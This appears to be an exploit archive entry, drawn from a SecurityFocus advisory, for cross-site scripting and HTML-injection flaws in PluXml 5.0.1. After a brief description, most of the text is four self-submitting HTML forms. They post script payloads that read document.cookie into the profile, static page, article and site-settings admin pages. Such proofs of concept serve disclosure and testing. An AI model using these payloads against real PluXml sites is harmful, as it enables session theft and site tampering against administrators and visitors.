@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/44069/info
+
+PluXml is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+PluXml 5.0.1 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/core/admin/profil.php" method="post" name="main" >
+
+<input type="hidden" name="name" value="Ildar">
+<input type="hidden" name="infos" value='<script>alert(document.cookie)</script>'>
+<input type="hidden" name="profil" value="Modifier votre profil">
+<input type="hidden" name="password1" value="">
+<input type="hidden" name="password2" value="">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+
+<form action="http://www.example.com/core/admin/statique.php" method="post" name="main" >
+<input type="hidden" name="id" value="001">
+<input type="hidden" name="content" value="<p><?php echo 'Ma premi&egrave;re page statique !'; ?></p><script>alert(document.cookie)</script>">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+
+<form action="http://www.example.com/core/admin/article.php" method="post" name="main" >
+
+<input type="hidden" name="artId" value="0001">
+<input type="hidden" name="title" value="article title">
+<input type="hidden" name="author" value="001">
+<input type="hidden" name="chapo" value="">
+<input type="hidden" name="content" value='page html content"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="day" value="23">
+<input type="hidden" name="month" value="09">
+<input type="hidden" name="year" value="2010">
+<input type="hidden" name="time" value="15:45">
+<input type="hidden" name="catId[]" value="001">
+<input type="hidden" name="new_catid" value="002">
+<input type="hidden" name="new_catname" value="">
+<input type="hidden" name="tags" value="PluXml">
+<input type="hidden" name="allow_com" value="1">
+<input type="hidden" name="url" value="article-page-url">
+<input type="hidden" name="template" value="article.php">
+<input type="hidden" name="preview" value="Aper&ccedil;u">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+<form action="http://www.example.com/core/admin/parametres_base.php" method="post" name="main" >
+<input type="hidden" name="title" value='PluXml"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="description" value="le blog full XML">
+<input type="hidden" name="racine" value="http://www.example.com/">
+<input type="hidden" name="delta" value="+00:00">
+<input type="hidden" name="allow_com" value="1">
+<input type="hidden" name="mod_com" value="0">
+<input type="hidden" name="editor" value="plxtoolbar">
+</form>
+<script>
+document.main.submit();
+</script>
